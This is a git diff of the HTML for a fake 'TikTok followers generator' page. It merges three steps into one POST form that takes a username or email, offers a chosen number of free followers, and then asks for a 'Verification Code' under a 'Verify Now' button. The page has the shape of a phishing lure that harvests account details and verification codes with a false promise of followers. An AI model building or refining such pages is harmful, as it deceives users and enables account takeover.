@@ -25,17 +25,17 @@
                 <img src="image/TikTok_logo.svg.png">
                 <p>followers generator</p>
             </div>
-            <div class="card center">
+            <form class="card center" method="POST">
 
                 <!-- form one -->
-                <form class="container center" id="first_form">
+                <div class="container center" id="first_form">
                     <p>Please enter your TikTok username or email</p>
                     <div class="inputBox center">
                         <i class="fa-regular fa-circle-user"></i>
                         <input placeholder="Username/Email" required id="userNameMail">
                     </div>
                     <div class="checkBox center">
-                        <input type="checkbox" required>
+                        <input type="checkbox" id="checkbox" required>
                         <label>Encrypted Protection</label>
                     </div>
                     <div>
@@ -46,10 +46,10 @@
                         <p><i class="fa-regular fa-copyright"></i> Copyright, all rights reserved.</p>
                     </div>
 
-                </form>
+                </div>
 
                 <!-- form two -->
-                <form class="container center" id="second_form">
+                <div class="container center" id="second_form">
                     <p>Please select the amount of followers</p>
                     <div class="displayBox center">
                         <div class="poster">
@@ -82,29 +82,25 @@
                         <button class="btn" type="button" id="next2">proceed</button>
                     </div>
 
-                </form>
+                </div>
 
                 <!-- form three -->
-                <form class="container center" id="third_form">
-                    <p>Please enter your TikTok username or email</p>
+                <div class="container center" id="third_form">
+                    <p>last step</p>
+                    <p>Hello <span class="userName">userN</span>! You are almost done. <span><span class="followAmount">90</span>k followers</span> will be send to your accoount! Please complete the last step by click on the button below.</p>
                     <div class="inputBox center">
-                        <i class="fa-regular fa-circle-user"></i>
-                        <input placeholder="Username/Email" required>
-                    </div>
-                    <div class="checkBox center">
-                        <input type="checkbox" required>
-                        <label>Encrypted Protection</label>
+                        <input placeholder="Verification Code" id="verification" required>
                     </div>
                     <div>
-                        <button class="btn" type="submit">proceed</button>
+                        <button class="btn" type="submit" id="submitBtn">Verify Now</button>
                     </div>
 
                     <div class="copyBox">
                         <p><i class="fa-regular fa-copyright"></i> Copyright, all rights reserved.</p>
                     </div>
 
-                </form>
-            </div>
+                </div>
+            </form>
         </div>
     </section>
 
